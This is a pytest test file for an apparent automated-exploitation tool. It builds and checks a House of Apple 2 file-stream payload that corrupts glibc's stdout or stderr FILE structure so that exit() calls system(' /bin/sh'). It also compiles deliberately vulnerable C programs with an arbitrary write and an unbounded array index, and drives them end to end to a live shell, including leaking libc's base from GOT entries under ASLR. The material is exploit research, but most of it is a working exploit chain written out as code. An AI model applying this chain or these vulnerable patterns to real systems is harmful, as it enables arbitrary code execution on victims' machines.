"""House of Apple 2: turn an arbitrary write + a libc leak into a shell on modern glibc (>= 2.34,
where __free_hook/__malloc_hook are gone) by corrupting _IO_2_1_stdout_ into a fake _IO_FILE that
routes a flush through _IO_wfile_jumps to system(command)."""
import glob
import os
import re
import select
import shutil
import struct
import subprocess
import time

import pytest
from lykos.analyze.poc import heap

_SYS_LIBC = next(iter(glob.glob("/usr/lib/x86_64-linux-gnu/libc.so.6")
                      + glob.glob("/lib/x86_64-linux-gnu/libc.so.6")), None)


def test_build_house_of_apple2_structure():
    blob = heap.build_house_of_apple2(0x1000, wfile_jumps=0xAAAA, system=0xBBBB)
    q = lambda o: struct.unpack_from("<Q", blob, o)[0]   # noqa: E731
    assert blob[:8] == b" /bin/sh"                        # _flags == the command (leading space)
    assert q(0x28) == 1                                   # _IO_write_ptr > _IO_write_base -> flush
    assert q(0xA0) == 0x1000 + 0xE0                       # _wide_data (self-contained)
    assert q(0xD8) == 0xAAAA                              # vtable == _IO_wfile_jumps
    assert q(0xE0 + 0xE0) == 0x1000 + 0x200               # _wide_data->_wide_vtable
    assert q(0x200 + 0x68) == 0xBBBB                      # wide vtable __doallocate == system


def test_house_of_apple2_targets():
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    T = heap.house_of_apple2_targets(open(_SYS_LIBC, "rb").read())
    assert set(T) == {"stdout", "wfile_jumps", "system"} and all(v > 0 for v in T.values())


def _read(p, secs, quiet=0.4):
    out, last, end = b"", time.time(), time.time() + secs
    while time.time() < end:
        r, _, _ = select.select([p.stdout], [], [], 0.1)
        if r:
            c = os.read(p.stdout.fileno(), 4096)
            if not c:
                break
            out += c
            last = time.time()
        elif p.poll() is not None:
            break
        elif out and time.time() - last > quiet:
            break
    return out


def test_house_of_apple2_spawns_shell_on_this_libc():
    """End-to-end on the host libc: a write-what-where + a stdout leak is turned into a real shell
    via House of Apple 2 (exit() flushes the corrupted stdout -> system("/bin/sh"))."""
    from lykos.analyze.dynamic import sandbox
    if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
        pytest.skip("x86-64 + system libc required")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    import tempfile
    from pathlib import Path
    d = Path(tempfile.mkdtemp())
    (d / "v.c").write_text(
        '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n'
        'int main(){ setvbuf(stdout,0,2,0); printf("leak:%p\\n",(void*)stdout); fflush(stdout);\n'
        '  while(1){ char c; if(read(0,&c,1)!=1)break;\n'
        '    if(c==\'w\'){ unsigned long a,l; char b[1024]; read(0,&a,8);read(0,&l,8);\n'
        '      if(l>1024)l=1024; read(0,b,l); memcpy((void*)a,b,l);}\n'
        '    else if(c==\'x\')exit(0);} return 0;}\n')
    exe = d / "v"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-w", str(d / "v.c"),
                       "-o", str(exe)], capture_output=True).returncode:
        shutil.rmtree(d, ignore_errors=True)
        pytest.skip("build failed")
    try:
        ld = open(_SYS_LIBC, "rb").read()
        T = heap.house_of_apple2_targets(ld)
        cmd = sandbox.isolate_prefix(str(d), net=False, rw_binds=[str(d)]) + [str(exe)]
        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, cwd=str(d))
        try:
            banner = _read(p, 0.6)
            m = re.search(rb"leak:(0x[0-9a-fA-F]+)", banner)
            if not m:
                pytest.skip("no leak (sandbox exec issue)")
            base = int(m.group(1), 16) - T["stdout"]
            stdout_addr = base + T["stdout"]
            blob = heap.build_house_of_apple2(stdout_addr, wfile_jumps=base + T["wfile_jumps"],
                                              system=base + T["system"])
            p.stdin.write(b"w" + struct.pack("<QQ", stdout_addr, len(blob)) + blob)
            p.stdin.flush()
            time.sleep(0.2)
            p.stdin.write(b"x")
            p.stdin.flush()
            time.sleep(0.3)
            p.stdin.write(b"echo FSOP_APPLE2_OK\n")
            p.stdin.flush()
            out = _read(p, 2.0, quiet=1.0)
            assert b"FSOP_APPLE2_OK" in out, f"no shell via House of Apple 2 (out={out[:80]!r})"
        finally:
            for s in (p.stdin, p.stdout):
                try:
                    s.close()
                except Exception:
                    pass
            p.kill()
    finally:
        shutil.rmtree(d, ignore_errors=True)


# ---------------------------------------------------------------- cell-at-a-time delivery (CWE-129)
# An `arr[i] = v` primitive writes ONE WORD at a chosen address, and the target's own code -- its
# next prompt -- runs between every write. The 0x300 blob above cannot be delivered that way: it
# lands over _IO_2_1_stdout_ and the stdout/stderr/stdin pointer variables that follow it, so the
# half-built FILE is used before it is finished. Five cells over a FILE the program never touches.
def test_house_of_apple2_cells_are_five_ordered_writes():
    cells = heap.house_of_apple2_cells(0x1000, wide_data=0x2000, wide_vtable=0x404060,
                                       wfile_jumps=0xAAAA, system=0xBBBB)
    assert cells == [(0x404060 + 0x68, 0xBBBB),          # the fake wide jump table's __doallocate
                     (0x2000 + 0xE0, 0x404060),          # the real _wide_data's _wide_vtable
                     (0x1000 + 0x28, 1),                 # _IO_write_ptr > _IO_write_base
                     (0x1000 + 0xD8, 0xAAAA),            # vtable == _IO_wfile_jumps
                     (0x1000, struct.unpack("<Q", b" /bin/sh")[0])]
    # _flags LAST: the command's leading space is _IO_ERR_SEEN, so writing it earlier stops that
    # FILE being usable -- which matters when the only forgeable FILE is one still being read.
    assert cells[-1][0] == 0x1000


def test_house_of_apple2_cell_targets_name_a_file_the_program_does_not_use():
    if not _SYS_LIBC:
        pytest.skip("no system libc")
    T = heap.house_of_apple2_cell_targets(open(_SYS_LIBC, "rb").read())
    assert T["fp_name"] == "_IO_2_1_stderr_" and T["fp"] > 0
    assert T["wfile_jumps"] > 0 and T["system"] > 0


_IDX_MENU = r'''#include <stdio.h>
long table[16];
int main(void){ setvbuf(stdout,0,2,0);
  for(;;){ printf("1.set 2.get 3.exit\n> ");
    int o; if(scanf("%d",&o)!=1) return 0;
    if(o==1){ long i,v; printf("idx: "); if(scanf("%ld",&i)!=1) return 0;
              printf("val: "); if(scanf("%ld",&v)!=1) return 0;
              table[i]=v; }
    else if(o==2){ long i; printf("idx: "); if(scanf("%ld",&i)!=1) return 0;
                   printf("%ld\n", table[i]); }
    else return 0; } }
'''


def test_indexed_write_fsop_reaches_a_shell_with_no_win_function():
    """The whole no-win route, live: an unbounded `table[i]` read recovers the libc base from a GOT
    slot under real ASLR, the paired write places the five cells over _IO_2_1_stderr_, and exit()
    spawns a shell. The fixture has no win function and no system() in its PLT, so every existing
    L2->L3 recipe is inapplicable by construction."""
    import tempfile
    from pathlib import Path

    from lykos.analyze.dynamic import sandbox
    from lykos.analyze.poc import leak, rop
    if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
        pytest.skip("x86-64 + system libc required")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = Path(tempfile.mkdtemp())
    try:
        (d / "t.c").write_text(_IDX_MENU)
        exe = d / "idx"
        if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-O0", "-w", str(d / "t.c"),
                           "-o", str(exe)], capture_output=True).returncode:
            pytest.skip("build failed")
        from lykos.analyze.poc import exploit
        blob = exe.read_bytes()
        table = exploit.elf_objects_sized(blob)["table"][0]
        res = leak.indexed_write_fsop(
            exe, d,
            write_cell=lambda a, v: b"1\n%d\n%d\n" % ((a - table) // 8,
                                                      struct.unpack("<q", struct.pack("<Q", v))[0]),
            read_cell=lambda a: b"2\n%d\n" % ((a - table) // 8),
            libc_data=open(_SYS_LIBC, "rb").read(),
            leak_slots=[(a, n) for n, a in rop.got_entries(blob).items()],
            scratch=table, exit_seqs=(b"3\n", b"q\n"))
        assert res["ok"], res.get("reason")
        assert res["libc_base"] % 0x1000 == 0 and len(res["cells"]) == 5
        assert res["fp_name"] == "_IO_2_1_stderr_"
    finally:
        shutil.rmtree(d, ignore_errors=True)
